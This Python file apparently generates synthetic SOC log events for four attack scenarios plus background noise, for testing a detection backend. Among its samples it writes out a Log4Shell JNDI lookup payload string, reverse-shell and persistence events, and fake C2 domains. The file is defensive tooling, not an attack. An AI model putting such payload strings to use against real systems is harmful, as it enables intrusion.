#!/usr/bin/env python3
"""ACCC Mock Log Generator — G-12: All 5 attack scenarios.

Architecture:
  S-05 background noise runs continuously at LOG_GENERATOR_RATE events/min.
  S-01 through S-04 are triggered on-demand via POST /trigger/{scenario}.
  All events are POSTed to backend /api/v1/events/ingest as realistic log formats.

HTTP server runs on :8080 for health checks and trigger endpoints.
"""
from __future__ import annotations
import asyncio, json, logging, os, random, time
from datetime import datetime, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread

import httpx

logging.basicConfig(level=logging.INFO, format="%(asctime)s [generator] %(levelname)s %(message)s")
log = logging.getLogger(__name__)

BACKEND_URL    = os.environ.get("BACKEND_URL", "http://backend:8000")
RATE_PER_MIN   = int(os.environ.get("LOG_GENERATOR_RATE", "30"))
INGEST_URL     = f"{BACKEND_URL}/api/v1/events/ingest"

# IPs used in scenarios
ATTACKER_IPS   = ["185.220.101.47", "45.142.212.100", "23.95.97.10", "185.100.86.178",
                  "194.165.16.72", "91.92.251.34", "107.173.168.4", "66.175.216.196"]
INTERNAL_IPS   = ["10.0.1.10", "10.0.1.15", "10.0.2.20", "10.0.2.25",
                  "10.0.3.30", "10.0.3.35", "192.168.1.100", "192.168.1.105"]
INTERNAL_HOSTS = ["workstation-014", "workstation-022", "finance-srv-01",
                  "web-app-03", "dc-primary", "file-share-02", "jumpbox-01"]
USERNAMES      = ["jsmith", "alee", "mwilson", "rbrown", "skhan", "tjones"]


# ─────────────────────────────────────────────────────────────────────────────
# EVENT BUILDERS — each returns a raw_log string in a realistic format
# ─────────────────────────────────────────────────────────────────────────────

def _ts() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def make_cef_portscan(src_ip: str, dst_ip: str) -> str:
    return (f"CEF:0|ArcSight|SmartConnector|8.4.0|100|Port Scan Detected|7|"
            f"src={src_ip} dst={dst_ip} spt={random.randint(1024,65535)} "
            f"dpt={random.choice([22,80,443,3389,445,8080])} "
            f"proto=TCP act=blocked deviceAddress={dst_ip} "
            f"rt={int(time.time()*1000)} cs1=PORTSCAN-RULE-001")


def make_cef_brute(src_ip: str, username: str) -> str:
    return (f"CEF:0|Cisco|ASA|9.16|106023|VPN Authentication Failure|7|"
            f"src={src_ip} suser={username} act=blocked "
            f"deviceAddress=vpn.corp.local dpt=443 proto=HTTPS "
            f"rt={int(time.time()*1000)} "
            f"msg=Authentication failed for user {username} from {src_ip}")


def make_cef_lateral(src_ip: str, dst_ip: str, username: str) -> str:
    return (f"CEF:0|Microsoft|Windows|10.0|4648|Explicit Credential Logon|7|"
            f"src={src_ip} dst={dst_ip} suser={username} "
            f"act=allow deviceAddress={dst_ip} dpt=445 proto=SMB "
            f"rt={int(time.time()*1000)} cs1=LATERAL-MOVEMENT-RULE")


def make_win_persistence(hostname: str, username: str) -> str:
    return json.dumps({
        "EventID": 4698,
        "Level": 2,
        "TimeCreated": _ts(),
        "Computer": hostname,
        "EventData": {
            "SubjectUserName": username,
            "TaskName": "\\Microsoft\\Windows\\WindowsUpdate\\svchost_update",
            "TaskContent": "<Actions><Exec><Command>C:\\Windows\\Temp\\payload.exe</Command></Exec></Actions>",
        },
    })


def make_cef_encryption(hostname: str) -> str:
    return (f"CEF:0|Symantec|Endpoint|14.3|5001|Mass File Encryption Detected|10|"
            f"dhost={hostname} act=alert "
            f"deviceAddress={random.choice(INTERNAL_IPS)} "
            f"rt={int(time.time()*1000)} "
            f"msg=Ransomware behavior detected: 500+ files encrypted in 30s "
            f"cs1=RANSOMWARE-BEHAVIORAL-RULE")


def make_cef_c2beacon(src_ip: str, dst_ip: str) -> str:
    return (f"CEF:0|Palo Alto|NGFW|10.1|999999|C2 Beacon Detected|9|"
            f"src={src_ip} dst={dst_ip} dpt=443 proto=HTTPS "
            f"act=alert deviceAddress={src_ip} "
            f"rt={int(time.time()*1000)} "
            f"msg=Periodic beacon to known C2 infrastructure detected "
            f"cs1=C2-BEACON-RULE")


def make_syslog_auth_failure(src_ip: str, username: str, host: str = "auth-srv-01") -> str:
    ts = datetime.now(timezone.utc).strftime("%b %d %H:%M:%S")
    return (f"<86>{ts} {host} sshd[{random.randint(1000,9999)}]: "
            f"Failed password for invalid user {username} from {src_ip} port "
            f"{random.randint(1024,65535)} ssh2")


def make_syslog_auth_success(src_ip: str, username: str, host: str = "auth-srv-01") -> str:
    ts = datetime.now(timezone.utc).strftime("%b %d %H:%M:%S")
    return (f"<78>{ts} {host} sshd[{random.randint(1000,9999)}]: "
            f"Accepted password for {username} from {src_ip} port "
            f"{random.randint(1024,65535)} ssh2")


def make_cloudtrail_s3_access(username: str) -> str:
    return json.dumps({
        "eventVersion": "1.08",
        "eventName": "GetObject",
        "eventTime": _ts(),
        "sourceIPAddress": random.choice(INTERNAL_IPS),
        "userIdentity": {"type": "IAMUser", "userName": username},
        "requestParameters": {"bucketName": "corp-finance-reports", "key": "Q4_2025_financials.xlsx"},
        "errorCode": None,
        "awsRegion": "eu-west-1",
    })


def make_cloudtrail_bulk_download(username: str, src_ip: str) -> str:
    return json.dumps({
        "eventVersion": "1.08",
        "eventName": "GetObject",
        "eventTime": _ts(),
        "sourceIPAddress": src_ip,
        "userIdentity": {"type": "IAMUser", "userName": username},
        "requestParameters": {
            "bucketName": "corp-file-store",
            "key": f"sensitive/document_{random.randint(1,9999)}.pdf"
        },
        "errorCode": None,
        "awsRegion": "eu-west-1",
    })


def make_json_usb(username: str, hostname: str) -> str:
    return json.dumps({
        "timestamp": _ts(),
        "severity": "HIGH",
        "event_type": "removable_media_connected",
        "source": hostname,
        "hostname": hostname,
        "username": username,
        "message": f"USB mass storage device connected by {username}",
        "device_id": f"USB\\VID_{random.randint(1000,9999)}&PID_{random.randint(1000,9999)}",
        "mitre_tactic": "Exfiltration",
        "mitre_technique": "T1052",
    })


def make_json_dlp_block(username: str, hostname: str) -> str:
    return json.dumps({
        "timestamp": _ts(),
        "severity": "HIGH",
        "event_type": "dlp_violation",
        "source": hostname,
        "hostname": hostname,
        "username": username,
        "action": "block",
        "message": f"DLP: Blocked upload of sensitive data to personal cloud storage by {username}",
        "bytes_blocked": random.randint(1_000_000, 50_000_000),
        "destination": "dropbox.com",
        "mitre_tactic": "Exfiltration",
        "mitre_technique": "T1567",
    })


def make_cef_log4shell_scan(src_ip: str, dst_ip: str) -> str:
    return (f"CEF:0|Qualys|Scanner|10.0|CVE-2021-44228|Log4Shell Scan Detected|9|"
            f"src={src_ip} dst={dst_ip} dpt=8080 proto=HTTP act=alert "
            f"deviceAddress={dst_ip} rt={int(time.time()*1000)} "
            f"msg=${{jndi:ldap://{src_ip}:1389/exploit}} cs1=CVE-2021-44228-SCAN")


def make_cef_log4shell_exploit(src_ip: str, dst_ip: str) -> str:
    return (f"CEF:0|Palo Alto|NGFW|10.1|CVE-2021-44228|Log4Shell Exploit Attempt|10|"
            f"src={src_ip} dst={dst_ip} dpt=8080 proto=HTTP act=alert "
            f"deviceAddress={dst_ip} rt={int(time.time()*1000)} "
            f"msg=Log4Shell exploit payload delivered: JNDI LDAP callback initiated "
            f"cs1=CVE-2021-44228-EXPLOIT")


def make_json_rce(dst_ip: str) -> str:
    return json.dumps({
        "timestamp": _ts(),
        "severity": "CRITICAL",
        "event_type": "remote_code_execution",
        "source": dst_ip,
        "hostname": "web-app-03",
        "message": "Remote code execution detected via Log4Shell: java process spawned shell",
        "process_name": "java",
        "mitre_tactic": "Execution",
        "mitre_technique": "T1059",
    })


def make_json_reverse_shell(src_ip: str, dst_ip: str) -> str:
    return json.dumps({
        "timestamp": _ts(),
        "severity": "CRITICAL",
        "event_type": "reverse_shell",
        "source": dst_ip,
        "hostname": "web-app-03",
        "src_ip": src_ip,
        "dst_ip": dst_ip,
        "dst_port": 4444,
        "protocol": "TCP",
        "message": f"Reverse shell established from web-app-03 to {src_ip}:4444",
        "process_name": "bash",
        "action": "alert",
        "mitre_tactic": "Command and Control",
        "mitre_technique": "T1059",
    })


def make_win_privesc(hostname: str) -> str:
    return json.dumps({
        "EventID": 4672,
        "Level": 2,
        "TimeCreated": _ts(),
        "Computer": hostname,
        "EventData": {
            "SubjectUserName": "SYSTEM",
            "PrivilegeList": "SeDebugPrivilege\nSeImpersonatePrivilege\nSeTcbPrivilege",
        },
    })


# ── Background noise events ───────────────────────────────────────────────────

def make_noise_event() -> str:
    """Generate realistic background SOC noise."""
    choice = random.randint(0, 9)
    src_ip = random.choice(ATTACKER_IPS + INTERNAL_IPS)
    user = random.choice(USERNAMES)
    host = random.choice(INTERNAL_HOSTS)

    if choice == 0:
        return make_syslog_auth_failure(src_ip, user)
    elif choice == 1:
        return make_cef_portscan(src_ip, random.choice(INTERNAL_IPS))
    elif choice == 2:
        # Suspicious DNS query
        ts = datetime.now(timezone.utc).strftime("%b %d %H:%M:%S")
        domain = f"{random.choice(['update','cdn','api','sync'])}.{random.choice(['evil.cc','tracker.io','c2corp.ru'])}"
        return (f"<86>{ts} dns-server named[1234]: "
                f"client {src_ip}#53: query: {domain} IN A + (10.0.0.1)")
    elif choice == 3:
        return make_syslog_auth_success(random.choice(INTERNAL_IPS), user)
    elif choice == 4:
        # Normal web traffic
        return json.dumps({
            "timestamp": _ts(), "severity": "LOW",
            "event_type": "http_request", "source": src_ip,
            "src_ip": src_ip, "dst_ip": random.choice(INTERNAL_IPS),
            "dst_port": 80, "protocol": "HTTP",
            "action": "allow", "hostname": host,
            "message": f"GET /index.html HTTP/1.1 200",
        })
    elif choice == 5:
        # Failed RDP
        return make_cef_brute(src_ip, user)
    elif choice == 6:
        # File access
        return json.dumps({
            "timestamp": _ts(), "severity": "LOW",
            "event_type": "file_access", "source": host,
            "hostname": host, "username": user,
            "message": f"File read: /home/{user}/documents/report.pdf",
        })
    elif choice == 7:
        # Normal CloudTrail
        return make_cloudtrail_s3_access(user)
    elif choice == 8:
        # AV scan
        return (f"CEF:0|Symantec|Endpoint|14.3|1000|Scheduled AV Scan Completed|1|"
                f"dhost={host} act=allow rt={int(time.time()*1000)} "
                f"msg=Scheduled antivirus scan completed: 0 threats found")
    else:
        # Generic low-severity JSON
        return json.dumps({
            "timestamp": _ts(), "severity": "LOW",
            "event_type": "user_login", "source": host,
            "hostname": host, "username": user,
            "src_ip": random.choice(INTERNAL_IPS),
            "message": f"User {user} logged in successfully",
        })


# ─────────────────────────────────────────────────────────────────────────────
# SCENARIO RUNNERS
# ─────────────────────────────────────────────────────────────────────────────

async def _post(raw_log: str):
    """POST a single event to backend ingest endpoint."""
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            await client.post(INGEST_URL, json={"raw_log": raw_log})
    except Exception as exc:
        log.debug("Ingest POST failed: %s", exc)


async def scenario_s01_ransomware():
    """S-01: Ransomware Deployment — ~90 seconds, CRITICAL."""
    log.info("S-01 Ransomware scenario started")
    attacker = random.choice(ATTACKER_IPS)
    target = random.choice(INTERNAL_IPS)
    username = random.choice(USERNAMES)
    hostname = random.choice(INTERNAL_HOSTS)

    # Phase 1: Port scan (10 events, 5s)
    log.info("S-01: Phase 1 - Port scanning")
    for _ in range(10):
        await _post(make_cef_portscan(attacker, target))
        await asyncio.sleep(0.5)

    # Phase 2: VPN brute force (25 events, 25s)
    log.info("S-01: Phase 2 - VPN brute force")
    for _ in range(25):
        await _post(make_cef_brute(attacker, username))
        await asyncio.sleep(1.0)

    # Phase 3: Lateral movement (8 events, 16s)
    log.info("S-01: Phase 3 - Lateral movement")
    for _ in range(8):
        src = random.choice(INTERNAL_IPS)
        dst = random.choice(INTERNAL_IPS)
        await _post(make_cef_lateral(src, dst, username))
        await asyncio.sleep(2.0)

    # Phase 4: Persistence (3 events, 6s)
    log.info("S-01: Phase 4 - Persistence installation")
    for _ in range(3):
        await _post(make_win_persistence(hostname, username))
        await asyncio.sleep(2.0)

    # Phase 5: File encryption start (5 events, 10s)
    log.info("S-01: Phase 5 - File encryption")
    for _ in range(5):
        await _post(make_cef_encryption(hostname))
        await asyncio.sleep(2.0)

    # Phase 6: C2 beacon (continuous — 10 events, 20s)
    log.info("S-01: Phase 6 - C2 beacon")
    for _ in range(10):
        await _post(make_cef_c2beacon(target, attacker))
        await asyncio.sleep(2.0)

    log.info("S-01 Ransomware scenario complete")


async def scenario_s02_credential_stuffing():
    """S-02: Credential Stuffing — ~3 minutes, HIGH."""
    log.info("S-02 Credential Stuffing scenario started")
    target_host = "web-portal-01"

    # Phase 1: 1200 failed auth attempts from 15 IPs over 3 min
    log.info("S-02: Phase 1 - Credential stuffing (1200 attempts)")
    source_ips = random.sample(ATTACKER_IPS * 3, min(15, len(ATTACKER_IPS) * 3))
    for i in range(1200):
        src_ip = random.choice(source_ips)
        username = f"user{random.randint(1000, 9999)}@corp.com"
        await _post(make_syslog_auth_failure(src_ip, username, target_host))
        await asyncio.sleep(0.15)  # ~400/min = 3 min total

    # Phase 2: 3 successful logins from new geolocation
    log.info("S-02: Phase 2 - 3 successful logins from new geo")
    for _ in range(3):
        src_ip = random.choice(ATTACKER_IPS)
        username = random.choice(USERNAMES)
        await _post(make_syslog_auth_success(src_ip, username, target_host))
        await asyncio.sleep(2.0)

    # Phase 3: Account enumeration
    log.info("S-02: Phase 3 - Account enumeration + data access")
    for username in USERNAMES[:3]:
        await _post(make_cloudtrail_s3_access(username))
        await asyncio.sleep(1.0)

    log.info("S-02 Credential Stuffing scenario complete")


async def scenario_s03_insider_threat():
    """S-03: Insider Threat — ~2 minutes, HIGH."""
    log.info("S-03 Insider Threat scenario started")
    username = random.choice(USERNAMES)
    hostname = random.choice(INTERNAL_HOSTS)
    src_ip = random.choice(INTERNAL_IPS)

    # Phase 1: After-hours access (23:00 timestamp — we just generate the event)
    log.info("S-03: Phase 1 - After-hours access")
    await _post(json.dumps({
        "timestamp": _ts(), "severity": "MEDIUM",
        "event_type": "after_hours_access",
        "source": hostname, "hostname": hostname,
        "username": username, "src_ip": src_ip,
        "message": f"After-hours system access by {username} at 23:00 local time",
        "mitre_tactic": "Collection", "mitre_technique": "T1074",
    }))
    await asyncio.sleep(2.0)

    # Phase 2: Bulk file download (50 events, 50s)
    log.info("S-03: Phase 2 - Bulk file download (50 files)")
    for _ in range(50):
        await _post(make_cloudtrail_bulk_download(username, src_ip))
        await asyncio.sleep(1.0)

    # Phase 3: USB mount
    log.info("S-03: Phase 3 - USB device connected")
    await _post(make_json_usb(username, hostname))
    await asyncio.sleep(3.0)

    # Phase 4: Cloud exfiltration attempt
    log.info("S-03: Phase 4 - Cloud exfiltration")
    await _post(json.dumps({
        "timestamp": _ts(), "severity": "HIGH",
        "event_type": "exfiltration_attempt",
        "source": hostname, "hostname": hostname,
        "username": username, "src_ip": src_ip,
        "dst_ip": "104.244.42.193", "dst_port": 443,
        "message": f"Large data transfer to personal cloud storage: {random.randint(1,14)}GB",
        "mitre_tactic": "Exfiltration", "mitre_technique": "T1567",
    }))
    await asyncio.sleep(2.0)

    # Phase 5: DLP block
    log.info("S-03: Phase 5 - DLP block triggered")
    await _post(make_json_dlp_block(username, hostname))

    log.info("S-03 Insider Threat scenario complete")


async def scenario_s04_log4shell():
    """S-04: Log4Shell Exploit (CVE-2021-44228) — ~60 seconds, CRITICAL."""
    log.info("S-04 Log4Shell exploit scenario started")
    attacker = random.choice(ATTACKER_IPS)
    target = "10.0.1.50"  # Apache web app

    # Phase 1: CVE scan (5 events, 10s)
    log.info("S-04: Phase 1 - Log4Shell scanning")
    for _ in range(5):
        await _post(make_cef_log4shell_scan(attacker, target))
        await asyncio.sleep(2.0)

    # Phase 2: Exploit delivery
    log.info("S-04: Phase 2 - Exploit attempt on Apache")
    await _post(make_cef_log4shell_exploit(attacker, target))
    await asyncio.sleep(3.0)

    # Phase 3: RCE
    log.info("S-04: Phase 3 - Remote code execution")
    await _post(make_json_rce(target))
    await asyncio.sleep(3.0)

    # Phase 4: Reverse shell
    log.info("S-04: Phase 4 - Reverse shell established")
    await _post(make_json_reverse_shell(attacker, target))
    await asyncio.sleep(5.0)

    # Phase 5: Privilege escalation
    log.info("S-04: Phase 5 - Privilege escalation")
    await _post(make_win_privesc("web-app-03"))

    log.info("S-04 Log4Shell exploit scenario complete")


# ─────────────────────────────────────────────────────────────────────────────
# BACKGROUND NOISE LOOP — S-05
# ─────────────────────────────────────────────────────────────────────────────

async def background_noise_loop():
    """S-05: Continuous background noise at LOG_GENERATOR_RATE events/min."""
    interval = 60.0 / RATE_PER_MIN
    log.info("S-05 Background noise started at %d events/min (interval=%.2fs)",
             RATE_PER_MIN, interval)
    while True:
        try:
            await _post(make_noise_event())
        except Exception as exc:
            log.debug("Noise event failed: %s", exc)
        await asyncio.sleep(interval)


# ─────────────────────────────────────────────────────────────────────────────
# HTTP TRIGGER SERVER
# ─────────────────────────────────────────────────────────────────────────────

# Shared event loop reference for triggering scenarios from HTTP handler
_loop: asyncio.AbstractEventLoop | None = None

SCENARIO_MAP = {
    "ransomware":          scenario_s01_ransomware,
    "credential_stuffing": scenario_s02_credential_stuffing,
    "insider_threat":      scenario_s03_insider_threat,
    "exploit":             scenario_s04_log4shell,
}


class TriggerHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # Suppress default HTTP logs

    def do_GET(self):
        if self.path == "/health":
            self._respond(200, {"status": "ok", "service": "log_generator"})
        elif self.path == "/scenarios":
            self._respond(200, {"scenarios": list(SCENARIO_MAP.keys()) + ["noise"]})
        else:
            self._respond(404, {"error": "not found"})

    def do_POST(self):
        parts = self.path.strip("/").split("/")
        if len(parts) == 2 and parts[0] == "trigger":
            scenario = parts[1]
            if scenario in SCENARIO_MAP and _loop:
                asyncio.run_coroutine_threadsafe(
                    SCENARIO_MAP[scenario](), _loop
                )
                self._respond(200, {"status": "triggered", "scenario": scenario})
            else:
                self._respond(400, {"error": f"unknown scenario: {scenario}"})
        else:
            self._respond(404, {"error": "not found"})

    def _respond(self, code: int, body: dict):
        data = json.dumps(body).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)


def run_http_server():
    server = HTTPServer(("0.0.0.0", 8080), TriggerHandler)
    log.info("Trigger HTTP server listening on :8080")
    server.serve_forever()


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────

async def wait_for_backend():
    """Wait until backend /health returns 200."""
    log.info("Waiting for backend at %s ...", BACKEND_URL)
    for attempt in range(60):
        try:
            async with httpx.AsyncClient(timeout=5.0) as client:
                r = await client.get(f"{BACKEND_URL}/health")
                if r.status_code == 200:
                    log.info("Backend ready (attempt %d)", attempt + 1)
                    return
        except Exception:
            pass
        await asyncio.sleep(3.0)
    log.warning("Backend not ready after 180s — starting anyway")


async def main():
    global _loop
    _loop = asyncio.get_running_loop()

    # Start HTTP trigger server in background thread
    http_thread = Thread(target=run_http_server, daemon=True)
    http_thread.start()

    await wait_for_backend()

    # Start S-05 background noise
    await background_noise_loop()


if __name__ == "__main__":
    asyncio.run(main())